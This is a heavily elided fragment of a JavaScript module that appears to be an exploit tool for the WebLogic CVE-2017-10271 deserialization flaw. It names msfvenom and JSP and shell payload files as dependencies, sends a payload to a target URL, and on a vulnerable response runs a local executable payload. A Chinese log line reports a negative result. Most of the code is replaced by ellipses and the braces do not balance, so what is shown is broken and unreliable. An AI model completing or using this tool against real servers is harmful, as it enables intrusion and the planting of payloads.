module.exports={
  ...
  dependencies:"payload/[x.jsp,*.sh],msfvenom",
	"ID":"030103",
    ...
    fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl,fnCbk2)
        {
          ...
          _t.sendPayload(url,szPld||s, oOpt, function (error, response, body)
          {
                ...
                if(r && r.vul)
                {
                   ...
                   else
                   {
                          ...
                          szJspPayload,szUrl,ckCbk = function()
                      {
                       ...
                       if(_s.fs.execSync("payload/noWWW_P65533.exe"))
              ...
              else _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && body && response.statusCode + (body || "")));
              //_s.log(body);
             }
           );
        };
